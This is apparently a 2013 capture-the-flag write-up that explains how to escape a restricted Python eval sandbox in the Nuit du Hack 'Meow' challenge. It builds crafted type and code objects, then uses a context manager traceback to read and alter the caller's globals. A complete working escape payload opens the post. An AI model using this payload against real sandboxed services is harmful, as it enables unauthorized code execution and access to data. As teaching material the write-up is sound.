---
title: 'Escapting a Python sandbox (NdH 2013 quals writeup)'
date: 2013-03-10T00:00:00+02:00
draft: false
---

The Nuit du Hack CTF 2013 Quals round was taking place yesterday. As usual,
I'll be posting a few writeups about fun exercises and/or solutions from this
CTF. If you want more, my teammate [w4kfu](http://blog.w4kfu.com/) should be
posting some writeups as well on his blog soon.

**TL;DR:**

{{< highlight python >}}
auth(''.__class__.__class__('haxx2',(),{'__getitem__':
lambda self,*a:'','__len__':(lambda l:l('function')( l('code')(
1,1,6,67,'d\x01\x00i\x00\x00i\x00\x00d\x02\x00d\x08\x00h\x02\x00'
'd\x03\x00\x84\x00\x00d\x04\x006d\x05\x00\x84\x00\x00d\x06\x006\x83'
'\x03\x00\x83\x00\x00\x04i\x01\x00\x02i\x02\x00\x83\x00\x00\x01z\n'
'\x00d\x07\x00\x82\x01\x00Wd\x00\x00QXd\x00\x00S',(None,'','haxx',
l('code')(1,1,1,83,'d\x00\x00S',(None,),('None',),('self',),'stdin',
'enter-lam',1,''),'__enter__',l('code')(1,2,3,87,'d\x00\x00\x84\x00'
'\x00d\x01\x00\x84\x00\x00\x83\x01\x00|\x01\x00d\x02\x00\x19i\x00'
'\x00i\x01\x00i\x01\x00i\x02\x00\x83\x01\x00S',(l('code')(1,1,14,83,
'|\x00\x00d\x00\x00\x83\x01\x00|\x00\x00d\x01\x00\x83\x01\x00d\x02'
'\x00d\x02\x00d\x02\x00d\x03\x00d\x04\x00d\n\x00d\x0b\x00d\x0c\x00d'
'\x06\x00d\x07\x00d\x02\x00d\x08\x00\x83\x0c\x00h\x00\x00\x83\x02'
'\x00S',('function','code',1,67,'|\x00\x00GHd\x00\x00S','s','stdin',
'f','',None,(None,),(),('s',)),('None',),('l',),'stdin','exit2-lam',
1,''),l('code')(1,3,4,83,'g\x00\x00\x04}\x01\x00d\x01\x00i\x00\x00i'
'\x01\x00d\x00\x00\x19i\x02\x00\x83\x00\x00D]!\x00}\x02\x00|\x02'
'\x00i\x03\x00|\x00\x00j\x02\x00o\x0b\x00\x01|\x01\x00|\x02\x00\x12'
'q\x1b\x00\x01q\x1b\x00~\x01\x00d\x00\x00\x19S',(0, ()),('__class__',
'__bases__','__subclasses__','__name__'),('n','_[1]','x'),'stdin',
'locator',1,''),2),('tb_frame','f_back','f_globals'),('self','a'),
'stdin','exit-lam',1,''),'__exit__',42,()),('__class__','__exit__',
'__enter__'),('self',),'stdin','f',1,''),{}))(lambda n:[x for x in
().__class__.__bases__[0].__subclasses__() if x.__name__ == n][0])})())
{{< /highlight >}}

One of the exercises, called "Meow", gave us a remote restricted Python shell
with most builtins disabled:

{{< highlight python >}}
{'int': <type 'int'>, 'dir': <built-in function dir>,
'repr': <built-in function repr>, 'len': <built-in function len>,
'help': <function help at 0x2920488>}
{{< /highlight >}}

A few functions were available, namely `kitty()` displaying an ASCII cat,
and `auth(password)`. I assumed our goal was to bypass the authentication or to
find the password. Unfortunately, our Python commands are passed to `eval` in
expression mode, which means we can't use any Python statement: no assignment,
no print, no function/class definitions, etc. This makes things a lot harder to
work with. We'll have to use some Python magic (this writeup will be full of
it, I promise).

I first assumed `auth` was simply comparing the password to a constant string.
In this case, I could use a custom object with `__eq__` overwritten to always
return True. However, there is no trivial way to craft that object: we can't
define our own classes using the `class Foo:` syntax, we can't modify an
already existing object (no assignment), etc. This is where our first bit of
Python magic comes into place: we can directly instantiate a `type` object to
create a class object, then instantiate this class object. Here is how you
would do it:

{{< highlight python >}}
type('MyClass', (), {'__eq__': lambda self: True})
{{< /highlight >}}

However, we can't use `type` here: it is not defined in our builtins. We can
use a second trick: every Python object has a `__class__` attribute, which
gives us the type of an object. For example, `''.__class__` is `str`. But more
interesting: `str.__class__` is `type`! Which means we can
use `''.__class__.__class__` to instantiate our new type.

Unfortunately, the `auth` function is not simply comparing our object to a
string. It's doing a lot of other things to it: slicing it to 14 characters,
taking its length via `len()` and calling `reduce` with a strange `lambda` as
well. Without the code it's going to be hard to guess how to make an object
that behaves exactly like the function wants, and I don't like guessing. We
need more magic!

Enter code objects. Python functions are actually objects which are made of a
code object and a capture of their global variables. A code object contains the
bytecode of that function, as well as the constant objects it refers to, some
strings and names, and other metadata (number of arguments, number of locals,
stack size, mapping from bytecode to line number). You can get the code object
of a function using `myfunc.func_code`. This is forbidden in the restricted
mode of the Python interpreter, so we can't see the code of
the `auth` function. However, we can craft our own functions like we crafted
our own types!

You might wonder: why do we need to use code objects to craft functions when we
already have `lambda`? Simple: lambdas cannot contain statements. Random
crafted functions can! For example, we can create a function that prints its
argument to stdout:

{{< highlight python >}}
ftype = type(lambda: None)
ctype = type((lambda: None).func_code)
f = ftype(ctype(1, 1, 1, 67, '|\x00\x00GHd\x00\x00S', (None,),
                (), ('s',), 'stdin', 'f', 1, ''), {})
f(42)
# Outputs 42
{{</ highlight >}}

There is a slight problem with this though: to get the type of a code object,
we need to access the `func_code` attribute, which is restricted. Fortunately,
we can use even more Python magic to find our type without accessing forbidden
attributes.

In Python, a type object has a `__bases__` attribute which returns the list of
all its base classes. It also has a `__subclasses__` method that returns the
list of all types that inherit from it. If we use `__bases__` on a random type,
we can reach the top of the type hierarchy (`object` type), then read the
subclasses of `object` to get a list of all types defined in the interpreter:

{{< highlight python >}}
>>> len(().__class__.__bases__[0].__subclasses__())
81
{{</ highlight >}}

We can then use this list to find our `function` and `code` types:

{{< highlight python >}}
>>> [x for x in ().__class__.__bases__[0].__subclasses__()
...  if x.__name__ == 'function'][0]
<type 'function'>
>>> [x for x in ().__class__.__bases__[0].__subclasses__()
...  if x.__name__ == 'code'][0]
<type 'code'>
{{</ highlight >}}

Now that we can build any function we want, what can we do? We can't directly
access the non restricted builtins: the functions we craft are still executed
in the restricted environment. We can get a non sandboxed function to call us:
the `auth` function call the `__len__` method of the object that we pass as a
parameter. This is however not enough to get out of the sandbox: our globals
are still the same and we can't for example import a module. I tried to look at
all the classes we could access via the `__subclasses__` trick to see if we
could get a reference to a useful module through there, but no dice. Even
getting Twisted to call one of our crafted functions via the `reactor` was not
enough. We could try to get a traceback object and use it to browse the stack
frames of our callers, but the only trivial ways to get a traceback object are
via the `inspect` or the `sys` modules which we can't import. After being
blocked on that problem, I went to work on other problems, slept a lot, and
woke up to the solution I needed!

There actually is another way to get a traceback object in Python without using
the standard library: context managers. They are a new feature of Python 2.6
which allow some kind of object life scoping in Python:

{{< highlight python >}}
class CtxMan:
    def __enter__(self):
        print 'Enter'
    def __exit__(self, exc_type, exc_val, exc_tb):
        print 'Exit:', exc_type, exc_val, exc_tb

with CtxMan():
    print 'Inside'
    error

# Output:
# Enter
# Inside
# Exit: <type 'exceptions.NameError'> name 'error' is not defined
        <traceback object at 0x7f1a46ac66c8>
{{</ highlight >}}

We can create a context manager object which will use the traceback object
passed to `__exit__` to display the global variables of our caller, caller
which is out of the restricted environment. To do that, we use a combination of
all our previous tricks. We create an anonymous type defining `__enter__` as a
simple lambda and `__exit__` as a lambda that accesses what we want in the
traceback and passes it to our `print` lambda (remember, we can't use
statements):

{{< highlight python >}}
''.__class__.__class__('haxx', (),
  {'__enter__': lambda self: None,
   '__exit__': lambda self, *a:
     (lambda l: l('function')(l('code')(1, 1, 1, 67, '|\x00\x00GHd\x00\x00S',
                                        (None,), (), ('s',), 'stdin', 'f',
                                        1, ''), {})
     )(lambda n: [x for x in ().__class__.__bases__[0].__subclasses__()
                    if x.__name__ == n][0])
     (a[2].tb_frame.f_back.f_back.f_globals)})()
{{</ highlight >}}

We need to go deeper! Now, we need to use this context manager (that we will
call `ctx` in our next code snippets) in a function that will purposefully
raise an error in a `with` block:

{{< highlight python >}}
def f(self):
    with ctx:
        raise 42
{{</ highlight >}}

And we put `f` as the `__len__` of our crafted object that we pass to
the `auth` function:

{{< highlight python >}}
auth(''.__class__.__class__('haxx2', (), {
  '__getitem__': lambda *a: '',
  '__len__': f
})())
{{</ highlight >}}

Refer to the beginning of the article for the "real" inlined code. When ran on
the server, this causes the Python interpreter to run our `f` function, go
through the crafted context manager `__exit__`, which will access the globals
from our caller, which contain these two interesting values:

```
'FLAG2': 'ICanHazUrFl4g', 'FLAG1': 'Int3rnEt1sm4de0fc47'
```

Two flags?! Turns out that the same service was used for two successive
exercises. Double kill!

For more fun, by accessing the globals we can do more than simply reading: we
can also modify the flags! Using `f_globals.update({ 'FLAG1': 'lol', 'FLAG2':
'nope' })` the flags are changed until the next server restart. This was
apparently not planned by the organizers.

Anyway, I still don't know how we were supposed to solve this challenge
normally, but I think this "generic" solution is a good way to introduce people
to some nice Python black magic. Use it carefully, it's easy to get Python to
segfault using crafted code objects (exploiting the Python interpreter and
running an x86 shellcode via crafted Python bytecode will be left as an
exercise for the reader). Thanks to the Nuit du Hack organizers for this nice
exercise.
